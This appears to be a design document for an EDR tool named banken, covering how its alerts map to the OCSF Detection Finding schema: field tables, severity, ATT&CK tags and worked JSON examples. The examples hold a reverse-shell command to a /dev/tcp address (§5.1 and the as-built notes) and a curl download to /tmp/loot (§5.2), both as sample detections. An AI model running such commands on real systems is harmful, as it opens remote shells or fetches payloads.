# OCSF output for banken alerts — design

Status: **implemented** (2026-10-31; prerequisites in `b4a026c`, the mapper and sinks in the
following commit). Written as a design against commit `17c1d21`; the "today" sections describe the
code as it was then. Where the build departed from the text below, this list wins:

**As built — decisions and divergences**
- Open questions answered (Conor): **1** pin 1.3.0; **2** pid/ppid on `Event`, yes; **3** the six
  rules tagged as proposed, untagged rules emit no `attacks`; **4** deterministic uid; **5**
  `product.vendor_name` is **`conor-sometimes`** (vendor = who makes it; `product.name` stays
  `banken`); **6** `desc` plumbed (`Alert.Desc` ← `Rule.Description`, trimmed), `log_name` later;
  **7** no format in the file name; **8** the compiled schema is regenerated, not checked in;
  **9, 10, 11** later.
- **pid/ppid are ints** (`Event.PID`/`PPID`, JSON `pid`/`ppid`, 0 = unknown), not the strings
  proposed in §4.5: OCSF `process.pid` is an integer, so no conversion. Rules still see
  `ProcessId`/`ParentProcessId` as strings via `Event.Field`, and the matcher's prefilter scans them.
- The detection fixtures now carry `pid`/`ppid` (real audit records always do); the documented
  pid-less case is a dedicated golden, `nopid.expect-reverse_shell.json`.
- The OCSF encoder turns **HTML escaping off**, so a command line such as `bash -i >& /dev/tcp/...`
  is written as-is, not as `>&`. (The native encoder is unchanged.)
- The `ocsf-schema` tags have **no `v` prefix** from 1.3.0 on (`1.3.0`, not `v1.3.0` as the §7.4
  sketch had); `just ocsf-validate` is the corrected recipe, and CI runs it as the `ocsf` job.
- **The official validator corrected two calls (§4.7, §3.1).** `observable.name` is *required* in
  1.3.0, not optional: every observable now names the attribute holding its value
  (`evidences.process.cmd_line`, `evidences.process.file.path`, `device.hostname`, ...; bare array
  notation), which the validator resolves and compares. And an IOC indicator is a substring of
  the command line, held by no attribute, so IOC findings now declare the **`osint`** profile
  (a `base_event` profile, so legal on 2004) and carry the matched indicator as
  `osint[0] = {type_id, type, value}` (IP Address 1, Domain 2, a path 99 "File Name"); its
  observable is `osint.value`. The profile's only requirement is that array, which banken fills.
- jsonl keeps `NewJSONLSink(dir, days)` and gains `NewJSONLSinkEncoded(dir, days, enc)` rather than
  the config-struct constructor of §6.3: same seam, no churn at existing call sites.

## TL;DR

- Emit each banken `Alert` as an **OCSF Detection Finding** (`class_uid` 2004, category Findings 2,
  activity Create). Security Finding (2001) is deprecated since OCSF 1.1.0 and is not used.
- Pin **OCSF 1.3.0** as the declared `metadata.version`. It is the newest version every real
  consumer found enforces (Amazon Security Lake custom sources: "1.3 and earlier"), every attribute
  we emit exists in it, and minor versions are additive, so a 1.3.0 document also validates under
  the current 1.9.0 schema. Bumping is a one-constant change plus a golden regeneration.
- The triggering `Event` becomes `evidences[0].process` (with `file`, `user`, `parent_process`) and a
  flat `observables[]` list a SIEM can pivot on; the normalised event JSON goes in `raw_data`.
- OCSF is an **output format, not a new transport**: a `Format`/`Encoder` seam on the existing
  `JSONLSink` (`alerts.jsonl.format: ocsf`) and a new `style: ocsf` on the existing `WebhookSink`.
  One mapping function, `ToOCSF(Alert, Options) Finding`, in `internal/alert/ocsf.go`. No new sink,
  no new package, no new retention code.
- **Zero new Go dependencies.** The finding is a plain struct marshalled by `encoding/json`. OCSF
  validation is a CI tool step (the official `ocsf-toolkit` CLI, pinned like `gosec` is), never a
  module dependency. The deterministic test is a golden file per baseline rule.
- Two small prerequisites outside the sink, both honest gaps today: the `Event` has no **pid**
  (OCSF's `process` object requires `pid` or `uid`), and neither `sigma.Rule` nor `Alert` carries
  the rule's **`tags`** (the only place ATT&CK lives). Both are a few lines each; both are listed
  under open questions because they touch parsers and rules, not just the sink.

## 1. Why OCSF, and what this is not

banken's alert today is its own camelCase JSON (`Alert` in `internal/alert/alert.go`). It is honest
and readable, but every SIEM that ingests it needs a custom parser or field mapping. OCSF (the Open
Cybersecurity Schema Framework, Linux Foundation, https://schema.ocsf.io) is the vendor-neutral
schema Amazon Security Lake, Splunk (OCSF-CIM add-on), Datadog, Google SecOps, CrowdStrike, Cisco
and others ingest natively. Emitting it means a banken alert lands in those tools as a first-class
finding with severity, ATT&CK and process evidence already in the right columns, with no per-SIEM
mapping on the operator's side.

Non-goals, deliberately:

- **Not replacing the native alert JSON.** The jsonl default stays `banken`; OCSF is opt-in. Existing
  webhook receivers keep getting what they get.
- **Not an OCSF *input*.** banken reads audit logs; this is only about what it writes.
- **Not a Security Lake shipper.** Security Lake wants Parquet in a partitioned S3 layout; that is a
  shipper's job (Vector, Fluent Bit, a Lambda), not a one-shot root EDR's. banken produces the JSON
  those shippers consume (see §8).
- **Not an OCSF SDK.** banken has one external dependency (`yaml.v3`; `rapid` is test-only) and a
  static `CGO_ENABLED=0` binary. The Go OCSF libraries that exist are either generated-from-protobuf
  struct bundles pinned to OCSF 1.0.0 (`valllabh/ocsf-schema-golang`, last published 2024), an
  unmaintained 2023 generator (`kai-ten/go-csf-schemas`), or the official `ocsf/ocsf-toolkit`
  (v0.9.0, Go 1.25+, Apache-2.0), which is an enrichment/validation pipeline over a compiled schema,
  not a typed emitter. None of them buys anything a ~250-line hand mapping does not, and all of them
  cost the dependency story. The mapping is small enough to read; that is the point of banken.

## 2. What a banken alert carries today (the input side, as the code is)

`internal/alert/alert.go`:

| `Alert` field | Type | Set by (`internal/engine/engine.go` `Match`) |
| --- | --- | --- |
| `Time` | `time.Time` | `ev.Time`; **zero** when the source had no parseable timestamp (every `tests/fixtures` event, every `banken check` event) |
| `Kind` | `"sigma"` \| `"ioc"` | which matcher fired |
| `Rule` | string | Sigma: `Rule.Name` (file basename, e.g. `reverse_shell`); IOC: the feed file name (`evil-c2.txt`) |
| `RuleID` | string | Sigma `id:` (a UUID in all 7 baseline rules); empty for IOC |
| `Title` | string | Sigma `title:`; IOC: `"IOC match: <value>"` |
| `Level` | string | Sigma `level:` or `"medium"` if absent (`defaultLevel`); IOC: always `"high"` |
| `Source` | string | `ev.Source`: `auditd`, `laurel`, `generic`, (`journald`, `syslog` stubs) |
| `IOC` | string | the matched indicator value (IOC only) |
| `Field` | string | which event field the indicator was found in (IOC only) |
| `Message` | string | `rule "x" matched` / `indicator "v" found in Field` |
| `Event` | `event.Event` | the triggering event, whole |

`internal/event/event.go` `Event`: `Time`, `Source`, `Image`, `CommandLine`, `ParentImage`,
`TargetFilename`, `User` (a name if the source translated the uid, else the numeric uid as a
string), `CurrentDirectory`, `Raw map[string]string` (extra Sigma-named fields; `omitempty`).

What the alert does **not** carry, and which matters for OCSF (each is picked up in §4):

- **No pid / ppid.** The auditd parser has `pid=`/`ppid=` in the SYSCALL record's field map and the
  Laurel parser has `SYSCALL.pid`/`SYSCALL.ppid` in hand, but neither puts them on the `Event`.
  `docs/log-sources.md` already says pid/ppid are to be *added* to `Event`, never reshaped in.
- **No hostname.** Nothing in the pipeline knows the host; `os.Hostname()` at sink construction
  is the only source.
- **No ATT&CK.** `sigma.rawRule` does not decode `tags:`; `Rule` has no `Tags`; `Alert` has none.
  Only 1 of 7 baseline rules (`tamper_banken`) even declares tags. The *directory* a rule lives in
  encodes its tactic by convention (`rules/command-and-control/`), but `Alert` does not carry
  `Rule.Path` either.
- **No rule description, no `logsource`, no `references`.** `Rule.Description` is parsed but not
  copied to `Alert`; `logsource` and `references` are not parsed at all.
- **No original log line.** Parsers normalise and drop the bytes; `raw_data` can only be the
  normalised event, and the mapping says so.
- **No source path.** `Event.Source` is the parser name, not `/var/log/audit/audit.log`; the path is
  known only in `main.scanOnce`.
- **No confidence, no disposition, no action.** banken is alert-only today; there is no notion of
  "blocked" or "allowed" to report.

## 3. Class and version

### 3.1 Class: Detection Finding (2004)

| | |
| --- | --- |
| Category | Findings, `category_uid` 2 |
| Class | Detection Finding, `class_uid` 2004 |
| Activity | Create, `activity_id` 1 (banken emits a finding once, when the rule fires) |
| `type_uid` | `class_uid * 100 + activity_id` = **200401** |
| Required attributes (base, no profiles) | `activity_id`, `category_uid`, `class_uid`, `type_uid`, `severity_id`, `time`, `finding_info`, `metadata` |
| Profiles banken declares | `host` only (it unlocks `device`; see below) |

Why not the alternatives:

- **Security Finding (2001)** is marked `@deprecated` since OCSF 1.1.0 ("Use the new specific
  classes according to the use-case": detection, vulnerability, compliance, incident, data
  security). A banken hit is exactly a detection.
- **Process Activity (1007)** describes the *event*, not the *verdict*. banken's value is the verdict
  (which rule, how severe, which ATT&CK); the process is evidence. OCSF models precisely this split:
  Detection Finding carries the verdict and embeds the process in `evidences[]`.
- **Incident Finding (2005)** is for correlated, assigned, ticketed incidents. Not banken's level.

**Profiles.** OCSF attributes are gated by profiles, and a profile declared in `metadata.profiles`
turns its required attributes on. banken declares **`host`** (so `device` is legal and the SIEM
learns which machine). It does **not** declare `security_control`: in 1.3.0 that profile makes
`action_id` *required* and banken has no action to report (alert-only). When response actions land
behind the `Responder` hook, the honest move is to add `security_control` then and fill
`action_id`/`disposition_id` from what the responder did. It does not declare `cloud` or `osint`
(both would add required attributes banken cannot fill).

### 3.2 Version: 1.3.0, pinned

OCSF releases are additive within 1.x (attributes and enum values are added, deprecated ones stay).
The producer declares the version it wrote against in `metadata.version`; consumers either accept
anything ≤ their ceiling or ignore attributes they do not know. So the right pin is **the highest
version every target consumer accepts, as long as everything we emit exists in it**:

| Consumer | Ceiling found (checked 2026-10-31) |
| --- | --- |
| Amazon Security Lake, custom sources | "OCSF version 1.3 and earlier" (docs.aws.amazon.com/security-lake/latest/userguide/custom-sources.html) |
| schema.ocsf.io server default | 1.9.0 (1.10.0-dev in progress) |
| Splunk OCSF-CIM add-on, Datadog, Google SecOps | no hard ceiling found; they map known attributes and keep the rest |

Everything in §4 exists in 1.3.0 (verified attribute-by-attribute against
`https://schema.ocsf.io/1.3.0/api/...`). What 1.3.0 **costs**, honestly:

| Not in 1.3.0 | Added in | What the mapping does instead |
| --- | --- | --- |
| `is_alert` (boolean, "this finding is an alert") | 1.4.0 | omitted; `status_id` 1 New carries the intent |
| `process.working_directory` | 1.4.0 | `CurrentDirectory` goes to `unmapped.current_directory` |
| `file.type_id` 8 Executable File | later | the executable is `type_id` 1 Regular File |
| `observable.type_id` 45 File Path | 1.5.0 | paths are observables of type 7 File Name, value = full path |

Bumping the pin is: change the `Version` constant, move the four rows above into their proper
homes, regenerate goldens, review the diff. A per-deployment `version:` config knob is deliberately
**not** proposed: one more option, four code paths, and no consumer that needs it yet.
(Open question 1.)

## 4. Field mapping

Conventions used throughout: `omit` means the attribute is not emitted at all (never emitted as
`""`, `null` or `0` — OCSF validators flag empty strings and a SIEM would index them). Enum
attributes follow OCSF's sibling convention: `severity_id` is the number, `severity` the caption;
a value banken cannot map goes to `99` Other with the raw string in the sibling. Timestamps in
OCSF are epoch **milliseconds** (`timestamp_t`); banken's `time.Time` is UTC already.

### 4.1 Top level

| OCSF attribute | Req. | From | Rule |
| --- | --- | --- | --- |
| `class_uid` / `class_name` | required / opt | constant | `2004` / `"Detection Finding"` |
| `category_uid` / `category_name` | required / opt | constant | `2` / `"Findings"` |
| `activity_id` / `activity_name` | required / opt | constant | `1` / `"Create"` |
| `type_uid` / `type_name` | required / opt | constant | `200401` / `"Detection Finding: Create"` |
| `time` | required | `Alert.Time` | `UnixMilli()`; if zero, `Options.Now()` (same fallback the jsonl sink uses for its file name) |
| `timezone_offset` | recommended | constant | `0` — banken normalises to UTC |
| `severity_id` / `severity` | required / opt | `Alert.Level` | table in §4.2 |
| `status_id` / `status` | recommended | constant | `1` / `"New"` |
| `message` | recommended | `Alert.Message` | verbatim |
| `metadata` | required | — | §4.3 |
| `finding_info` | required | — | §4.4 |
| `evidences` | recommended | `Alert.Event` | §4.5; one element |
| `device` | recommended (host profile) | `Options.Hostname` | §4.6; omitted entirely if hostname is empty (the object has an at-least-one constraint) |
| `observables` | recommended | `Alert.Event`, `Alert.IOC` | §4.7 |
| `raw_data` | optional | `Alert.Event` | `json.Marshal(Event)` as a string. **This is banken's normalised event, not the original audit record** (the parsers do not keep the bytes); the doc string on the field says so |
| `unmapped` | optional | leftovers | §4.8 |
| `confidence_id` | recommended | — | **omit.** banken has no confidence model; inventing one from Sigma `status: experimental` would be a lie |
| `count` | optional | — | omit (no aggregation; one finding per hit) |
| `attacks` (class level) | optional, `security_control` profile | — | omit; ATT&CK goes in `finding_info.attacks`, which is not profile-gated |
| `action_id`, `disposition_id` | `security_control` profile | — | omit until response actions exist (§3.1) |

### 4.2 Severity

`Alert.Level` is Sigma's `level:` (`critical|high|medium|low|informational`), lower-cased by the
journal sink's convention; the engine fills `medium` when a rule has none; IOC hits are `high`.

| `Alert.Level` | `severity_id` | `severity` |
| --- | --- | --- |
| `critical` | 5 | Critical |
| `high` | 4 | High |
| `medium` | 3 | Medium |
| `low` | 2 | Low |
| `informational` | 1 | Informational |
| `""` (cannot happen after `defaultLevel`, but the mapper is total) | 0 | Unknown |
| anything else (a rule that wrote `level: severe`) | 99 | the raw string |

Comparison is case-insensitive, like `journal.go`'s `severityFor`. OCSF `6 Fatal` is never used.

### 4.3 `metadata`

| Attribute | Req. | Value |
| --- | --- | --- |
| `version` | required | `"1.3.0"` (the pin, §3.2) |
| `profiles` | optional | `["host"]` |
| `product.name` | rec. (one of name/uid required) | `"banken"` |
| `product.vendor_name` | recommended | `"banken"` — there is no company; the project name is the honest vendor (open question 5) |
| `product.version` | recommended | `Options.ProductVersion`, i.e. `main.version` (`"dev"` or the git describe stamped by `just build`) |
| `product.url_string` | optional | `"https://github.com/conor-sometimes/banken"` |
| `uid` | optional | the finding uid (§4.4); one record per finding, so the record id and the finding id coincide today |
| `log_provider` | recommended | `Event.Source` (`"auditd"`, `"laurel"`, `"generic"`) — the parser that produced the evidence |
| `log_name` | recommended | **omit.** The source *path* is not on the alert (§2). Plumbing `config.Source.Path` onto `Alert` is possible but is a change to `engine.Match`'s signature for one attribute; not proposed for v1 |
| `original_time` | recommended | `Alert.Time` as RFC 3339 (`2026-10-31T12:00:00Z`) when non-zero; omit when the sink had to fall back to `Now()` so the fallback is visible |
| `logged_time` | optional | omit (would be `Now()`, which only makes goldens non-deterministic for no SIEM value) |

### 4.4 `finding_info`

| Attribute | Req. | Sigma alert | IOC alert |
| --- | --- | --- | --- |
| `uid` | required | deterministic id, below | same |
| `title` | required (1.3.0) | `Alert.Title` | `Alert.Title` (`"IOC match: 192.0.2.44"`) |
| `desc` | optional | **omit in v1**: `Rule.Description` is not on `Alert`. Copying it is a one-field addition to `Alert` and `engine.Match`; worth doing (open question 6) | omit |
| `analytic.type_id` / `type` | required | `1` / `"Rule"` | `9` / `"Exact Data Match"` — a flat indicator list matched by set membership is exactly that enum entry (present in 1.3.0) |
| `analytic.name` | rec. (one of name/uid) | `Alert.Rule` (`"reverse_shell"`) | `Alert.Rule` (the feed file, `"evil-c2.txt"`) |
| `analytic.uid` | recommended | `Alert.RuleID` (the Sigma UUID) when non-empty | omit (feeds have no id) |
| `analytic.version` | optional | omit (Sigma rules carry `date`/`modified`, not a version; not parsed) | omit |
| `attacks[]` | optional | from `Alert.Tags`, §4.4.2 | omit (an indicator has no technique) |
| `data_sources` | optional | `[Event.Source]` | same |
| `types` | optional | omit (Sigma `logsource.category` is not parsed; would be `["process_creation"]`) | omit |
| `src_url` | optional | omit (`references:` not parsed) | omit |

#### 4.4.1 The finding uid

`finding_info.uid` is required and is what a SIEM keys on. Two choices: a random UUID per emission,
or a deterministic digest of the finding's identity. **Deterministic** is proposed:

```
uid = hex(sha256("banken-ocsf-uid-v1\n" + Kind + "\n" + Rule + "\n" + RuleID + "\n"
                 + Time(RFC3339Nano, or "" if zero) + "\n" + Source + "\n" + ProcessID + "\n"
                 + Image + "\n" + CommandLine + "\n" + User + "\n" + IOC + "\n" + Field + "\n"))[:32]
```

Why: banken's cursor is "never fatal" — a corrupt state file re-reads a source and re-emits its
alerts, and `docs/architecture.md` calls that a "self-healing duplicate". With a content-derived uid
the re-emitted finding has the *same* uid and a SIEM de-duplicates it; with a random UUID the
operator sees two findings. It also makes the golden tests trivially deterministic. The leading
constant versions the scheme so it can change without colliding with old ids. The cost: two
genuinely distinct hits with identical tuple (same command, same user, same pid, same millisecond)
collapse into one uid. With `ProcessID` in the tuple that requires pid reuse within one ms, which
is not a realistic loss. Without pid (a `generic` source that did not supply one) it is possible but
rare, and the alert is still in the jsonl file. (Open question 4.)

#### 4.4.2 ATT&CK: `finding_info.attacks[]`

Prerequisite: parse Sigma `tags:` into `Rule.Tags []string` (a `Tags []string \`yaml:"tags"\`` on
`rawRule`, copied in `Compile`) and carry them as `Alert.Tags []string \`json:"tags,omitempty"\``
(set in `engine.Match`). This also improves the native alert JSON, so it is not OCSF-only plumbing.

Sigma's tag convention (SigmaHQ `Tags_specification`): `attack.<tactic>` with the tactic name
lower-cased and hyphenated, `attack.tNNNN` for a technique, `attack.tNNNN.NNN` for a
sub-technique; other namespaces (`attack.gNNNN` groups, `attack.sNNNN` software, `cve.*`, `car.*`,
`detection.*`, `tlp.*`) exist and are ignored here. The mapping, per rule:

1. Collect every tactic tag and every technique/sub-technique tag.
2. Tactic name → id by a **static 14-row table** (below); OCSF `tactic` needs `uid` or `name`, both
   are emitted.
3. `attack.t1562.001` → `technique.uid = "T1562"`, `sub_technique.uid = "T1562.001"`;
   `attack.t1059` → `technique.uid = "T1059"`, no sub-technique. **Technique names are not
   emitted**: that needs the ATT&CK dataset (hundreds of rows, versioned); `uid` alone satisfies the
   object's at-least-one constraint and is what SIEMs key on. `attack.version` is omitted for the
   same reason (Sigma tags carry no matrix version).
4. Emit one `attack` object per **technique** (or per sub-technique), each carrying the rule's
   tactic. A rule with a tactic tag and no technique emits one object with only `tactic`. A rule
   with no `attack.*` tags emits **no `attacks`** — nothing is guessed from the directory name
   (open question 3). Unknown tactic names (a typo) are dropped with nothing emitted for that tag;
   the rule-loader already reports structural problems, and a tag typo lint could join it later.

| Sigma tag | `tactic.uid` | `tactic.name` |
| --- | --- | --- |
| `attack.reconnaissance` | TA0043 | Reconnaissance |
| `attack.resource-development` | TA0042 | Resource Development |
| `attack.initial-access` | TA0001 | Initial Access |
| `attack.execution` | TA0002 | Execution |
| `attack.persistence` | TA0003 | Persistence |
| `attack.privilege-escalation` | TA0004 | Privilege Escalation |
| `attack.defense-evasion` | TA0005 | Defense Evasion |
| `attack.credential-access` | TA0006 | Credential Access |
| `attack.discovery` | TA0007 | Discovery |
| `attack.lateral-movement` | TA0008 | Lateral Movement |
| `attack.collection` | TA0009 | Collection |
| `attack.command-and-control` | TA0011 | Command and Control |
| `attack.exfiltration` | TA0010 | Exfiltration |
| `attack.impact` | TA0040 | Impact |

Today only `tamper_banken` has tags (`attack.defense-evasion`, `attack.t1562.001`). The other six
baseline rules need `tags:` added for their findings to carry ATT&CK at all; proposed values are in
open question 3. Until then those findings simply have no `attacks`, which is honest.

### 4.5 `evidences[0]`: the triggering event

One `evidences` element per finding. OCSF's `evidences` object requires at least one of its
sub-objects; banken always has a process (or, degenerately, a file).

| OCSF attribute | Req. | From | Rule |
| --- | --- | --- | --- |
| `process.pid` | rec. (**one of pid/uid required** by constraint) | `Event.ProcessID` (new, §2) | the integer pid; see "the pid problem" below |
| `process.name` | recommended | `Event.Image` | `path.Base(Image)`; omit if `Image` empty |
| `process.cmd_line` | recommended | `Event.CommandLine` | verbatim; omit if empty |
| `process.file.path` | recommended | `Event.Image` | the full path |
| `process.file.name` | required | `Event.Image` | `path.Base(Image)` |
| `process.file.type_id` / `type` | required | constant | `1` / `"Regular File"` (the kernel exec'd it; 1.3.0 has no Executable File value) |
| `process.user.name` | rec. (one of name/uid/account) | `Event.User` | when `User` is **not** all digits |
| `process.user.uid` | rec. | `Event.User` | when `User` **is** all digits (`"1000"`, `"0"`) — the parsers already do this split: a name if the source translated the uid, else the number |
| `process.user.type_id` | recommended | — | omit; guessing Admin from uid 0 is a heuristic the SIEM can apply itself |
| `process.parent_process.pid` | rec. (constraint) | `Event.ParentProcessID` (new) | |
| `process.parent_process.name` / `.file.{name,path,type_id}` | rec. | `Event.ParentImage` | same rules as the process; whole `parent_process` omitted when both `ParentImage` and `ParentProcessID` are empty |
| `process.working_directory` | — | `Event.CurrentDirectory` | **not in 1.3.0**; goes to `unmapped` (§3.2) |
| `file` (sibling of `process` inside the same evidence) | rec. | `Event.TargetFilename` | `{name: path.Base, path: full, type_id: 0 Unknown}` when non-empty — the acted-on PATH record (e.g. `/etc/shadow` for `credential_file_read`). banken does not know whether it is a regular file, so `0 Unknown` |
| whole `process` object | | | omitted only when `Image`, `CommandLine` and `ProcessID` are all empty (then `file` and/or `user` must be present or the alert could not have matched anything) |

**The pid problem.** OCSF's `process` object has `"constraints": {"at_least_one": ["pid","uid"]}`
in 1.3.0 (and `pid`/`uid`/`cpid` in 1.9.0); `uid` there is a process-instance id (a GUID or similar),
which banken also does not have. Without a pid every `process` object banken emits violates a
constraint. The validators treat this as a warning or error depending on the tool, and a strict
consumer may drop the object. So:

- The design makes **`Event.ProcessID` and `Event.ParentProcessID` (strings, like `User`, so a
  generic source's "unknown" stays `""`)** a prerequisite, filled by the auditd parser from
  `SYSCALL pid=`/`ppid=` and by the Laurel parser from `SYSCALL.pid`/`SYSCALL.ppid` (both values are
  already in the parsers' hands and currently discarded). The generic JSONL adapter gets them for
  free via JSON (`processId`, `parentProcessId`). `Event.Field` should expose them as `ProcessId`
  / `ParentProcessId` so Sigma rules can use them too (SigmaHQ's Linux rules reference
  `ProcessId`). Both parser goldens change; that diff is the review. (Open question 2.)
- When a source still has no pid (a hand-made `banken check` event, a thin generic feed), the mapper
  **still emits the process object without `pid`** rather than dropping `cmd_line`: the command
  line is the most valuable thing in the finding, and a constraint warning on a validator run is
  better than a finding with no evidence. The golden for that case documents the choice, and the
  validation recipe (§7.4) treats that one golden as warnings-allowed.

### 4.6 `device` (host profile)

| Attribute | Req. | Value |
| --- | --- | --- |
| `type_id` / `type` | required | `0` / `"Unknown"` — banken cannot tell a server from a VM from a laptop; the operator's SIEM inventory can |
| `hostname` | rec. (one of hostname/uid/name/ip required) | `Options.Hostname`: `os.Hostname()` once at sink construction in `main.buildSinks`, injected in tests |

If `os.Hostname()` fails or returns empty, `device` is omitted (the constraint would otherwise be
violated) and the sink logs it once. No `os` object (banken does not read `/etc/os-release`; it
could later, cheaply).

### 4.7 `observables[]`

Flat, typed, pivotable copies of the values a SOC searches on. Order is fixed (so goldens are
stable): command line, process name, process path, user, target file, hostname, then the IOC.

| `type_id` | `type` | `value` | When |
| --- | --- | --- | --- |
| 13 | Command Line | `Event.CommandLine` | non-empty |
| 9 | Process Name | `path.Base(Event.Image)` | non-empty |
| 7 | File Name | `Event.Image` (the full path; 45 File Path is not in 1.3.0) | non-empty |
| 4 | User Name | `Event.User` | non-empty and not all digits |
| 7 | File Name | `Event.TargetFilename` | non-empty |
| 1 | Hostname | `Options.Hostname` | non-empty |
| 2 / 1 / 7 | IP Address / Hostname / File Name | `Alert.IOC` | IOC alerts: by the indicator's shape, re-deriving `ioc.classify` (IP → 2, domain → 1, path → 7). The alert does not carry `ioc.Kind`; re-classifying the string is cheap and uses the same regexps (export `ioc.Classify` or duplicate three lines — the former) |

`observable.name` (the JSON-pointer-ish path to the attribute, e.g. `evidences.process.cmd_line`)
is recommended, not required. OCSF documents three notations for array members and the exact
spelling is validator-sensitive; v1 **omits `name`** on observables rather than guess, and the
validation step (§7.4) is where to confirm the spelling before adding it. `ocsf-toolkit` can also
*generate* observables from a compiled schema, which is the authoritative check of ours.

### 4.8 `unmapped`

Everything banken knows that has no clean home in 1.3.0, under stable snake_case keys so a SIEM
field extractor can be written once:

| Key | From | Note |
| --- | --- | --- |
| `kind` | `Alert.Kind` | `sigma` / `ioc` |
| `rule` | `Alert.Rule` | duplicates `analytic.name`; kept because SIEM users search `unmapped.rule` before they find `finding_info.analytic.name` |
| `source` | `Event.Source` | duplicates `metadata.log_provider`, same reason |
| `current_directory` | `Event.CurrentDirectory` | until the pin moves to ≥ 1.4.0 (`process.working_directory`) |
| `ioc_field` | `Alert.Field` | IOC alerts: which event field the indicator was found in |
| `raw.<SigmaField>` | `Event.Raw` | each `Raw` entry, keys sorted, prefixed; `Raw` is a `map`, so sorting is what keeps the golden byte-stable |

Keys are omitted when empty. `unmapped` is omitted when it would be empty (it never is for a real
alert; `kind` is always set).

### 4.9 Honest "no home" list

| banken field | Status |
| --- | --- |
| `Alert.Kind` | `unmapped.kind` plus `analytic.type_id` (Rule vs Exact Data Match) — the latter is the real OCSF home, the former is for humans |
| `Alert.Field` (IOC) | `unmapped.ioc_field`; OCSF has no "where in the event the indicator was seen" attribute short of `observable.name`, which is a schema path, not a source field |
| `Event.CurrentDirectory` | `unmapped` until ≥ 1.4.0 |
| `Event.Raw` | `unmapped.raw.*`; by definition fields without a dedicated home |
| the original audit record | not available; `raw_data` is the normalised event and says so |
| `Rule.Description`, `logsource`, `references`, `falsepositives`, `author`, `date`, `status` | not on `Alert`; `desc` and `types` are the two worth plumbing (open question 6) |
| which source *file* | not on `Alert`; `metadata.log_name` stays empty (open question 6) |

## 5. Worked example

### 5.1 A Sigma hit: `reverse_shell`

Input: the first event of `tests/fixtures/revshell.expect-reverse_shell.json`, given a time, a pid,
a ppid and a parent image (the fixture has none of these; the values below are illustrative), matched by
`rules/command-and-control/reverse_shell.yml` (`level: critical`, id
`0c9b10de-25ea-4ad5-8e07-d33508386857`). The `attacks` block assumes the **proposed** tags
`attack.command-and-control` and `attack.t1059.004` (Unix Shell) — the rule carries no tags today,
so as the code stands that block would be absent (§4.4.2). Options: hostname `hokkaido`, product
version `0.3.0`.

The banken alert, as the jsonl sink writes it today:

```json
{"time":"2026-10-31T12:00:00Z","kind":"sigma","rule":"reverse_shell","ruleId":"0c9b10de-25ea-4ad5-8e07-d33508386857","title":"Reverse shell spawned","level":"critical","source":"auditd","message":"rule \"reverse_shell\" matched","event":{"time":"2026-10-31T12:00:00Z","source":"auditd","image":"/usr/bin/bash","commandLine":"bash -c bash -i >& /dev/tcp/192.0.2.30/4444 0>&1","parentImage":"/usr/bin/sshd","targetFilename":"","user":"1000","currentDirectory":"/home/u","processId":"4242","parentProcessId":"4100"}}
```

The same alert as an OCSF 1.3.0 Detection Finding (pretty-printed here; the sink writes one line).
`time` is `2026-10-31T12:00:00Z` in epoch ms; `finding_info.uid` is the §4.4.1 digest of this
alert's tuple:

```json
{
  "activity_id": 1,
  "activity_name": "Create",
  "category_uid": 2,
  "category_name": "Findings",
  "class_uid": 2004,
  "class_name": "Detection Finding",
  "type_uid": 200401,
  "type_name": "Detection Finding: Create",
  "time": 1793448000000,
  "timezone_offset": 0,
  "severity_id": 5,
  "severity": "Critical",
  "status_id": 1,
  "status": "New",
  "message": "rule \"reverse_shell\" matched",
  "metadata": {
    "version": "1.3.0",
    "profiles": ["host"],
    "product": {
      "name": "banken",
      "vendor_name": "banken",
      "version": "0.3.0",
      "url_string": "https://github.com/conor-sometimes/banken"
    },
    "uid": "37b4e9e563f5f41cfa2a308fdb85037b",
    "log_provider": "auditd",
    "original_time": "2026-10-31T12:00:00Z"
  },
  "finding_info": {
    "uid": "37b4e9e563f5f41cfa2a308fdb85037b",
    "title": "Reverse shell spawned",
    "analytic": {
      "type_id": 1,
      "type": "Rule",
      "name": "reverse_shell",
      "uid": "0c9b10de-25ea-4ad5-8e07-d33508386857"
    },
    "attacks": [
      {
        "tactic": { "uid": "TA0011", "name": "Command and Control" },
        "technique": { "uid": "T1059" },
        "sub_technique": { "uid": "T1059.004" }
      }
    ],
    "data_sources": ["auditd"]
  },
  "evidences": [
    {
      "process": {
        "pid": 4242,
        "name": "bash",
        "cmd_line": "bash -c bash -i >& /dev/tcp/192.0.2.30/4444 0>&1",
        "file": { "name": "bash", "path": "/usr/bin/bash", "type_id": 1, "type": "Regular File" },
        "user": { "uid": "1000" },
        "parent_process": {
          "pid": 4100,
          "name": "sshd",
          "file": { "name": "sshd", "path": "/usr/bin/sshd", "type_id": 1, "type": "Regular File" }
        }
      }
    }
  ],
  "device": { "type_id": 0, "type": "Unknown", "hostname": "hokkaido" },
  "observables": [
    { "type_id": 13, "type": "Command Line", "value": "bash -c bash -i >& /dev/tcp/192.0.2.30/4444 0>&1" },
    { "type_id": 9, "type": "Process Name", "value": "bash" },
    { "type_id": 7, "type": "File Name", "value": "/usr/bin/bash" },
    { "type_id": 1, "type": "Hostname", "value": "hokkaido" }
  ],
  "raw_data": "{\"time\":\"2026-10-31T12:00:00Z\",\"source\":\"auditd\",\"image\":\"/usr/bin/bash\",\"commandLine\":\"bash -c bash -i >& /dev/tcp/192.0.2.30/4444 0>&1\",\"parentImage\":\"/usr/bin/sshd\",\"targetFilename\":\"\",\"user\":\"1000\",\"currentDirectory\":\"/home/u\",\"processId\":\"4242\",\"parentProcessId\":\"4100\"}",
  "unmapped": {
    "kind": "sigma",
    "rule": "reverse_shell",
    "source": "auditd",
    "current_directory": "/home/u"
  }
}
```

Things to notice: no `user` observable (the user is a numeric uid, not a name); no `file` evidence
(no `TargetFilename`); `raw_data` is the camelCase banken event, verbatim, so the native shape is
always recoverable from the OCSF record; the IP `192.0.2.30` is **not** extracted as an observable —
banken did not parse it (it is a substring the rule matched on), and inventing network observables
by regexp over command lines is a different feature.

### 5.2 An IOC hit, abbreviated

`curl -s http://192.0.2.44/x -o /tmp/loot` (pid 4250, user 1000, 12:00:05Z) against
`rules/ioc/evil-c2.txt` containing `192.0.2.44`. Only the parts that differ from §5.1:

```json
{
  "severity_id": 4, "severity": "High",
  "message": "indicator \"192.0.2.44\" found in CommandLine",
  "metadata": { "...": "...", "uid": "ec233faa4569bdfbe6750a20a1d2312e" },
  "finding_info": {
    "uid": "ec233faa4569bdfbe6750a20a1d2312e",
    "title": "IOC match: 192.0.2.44",
    "analytic": { "type_id": 9, "type": "Exact Data Match", "name": "evil-c2.txt" },
    "data_sources": ["auditd"]
  },
